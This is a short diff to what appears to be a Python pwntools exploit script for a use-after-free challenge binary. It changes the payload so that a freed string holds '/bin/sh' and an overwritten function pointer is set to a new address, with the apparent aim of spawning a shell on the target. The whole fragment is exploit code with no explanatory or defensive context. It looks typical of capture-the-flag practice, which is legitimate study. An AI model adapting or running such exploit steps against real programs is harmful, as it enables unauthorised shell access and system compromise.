@@ -64,7 +64,7 @@ def stage_0_create_and_free(target):
     target.sendlineafter('> ',          cmd_create)
     target.sendlineafter('Type?',       type_string)
     target.sendlineafter('Length?',     str(10))
-    target.sendlineafter('Contents?',   'A'*8)
+    target.sendlineafter('Contents?',   '/bin/sh')
 
     #free the string
     target.sendlineafter('> ',          cmd_delete)
@@ -73,7 +73,7 @@ def stage_0_create_and_free(target):
     # create something else
     target.sendlineafter('> ', cmd_create)
     target.sendlineafter('Type?', type_number)
-    target.sendlineafter('Value?',  str(0x004008a7))
+    target.sendlineafter('Value?',  str(0x004006e0))
     return
 
 
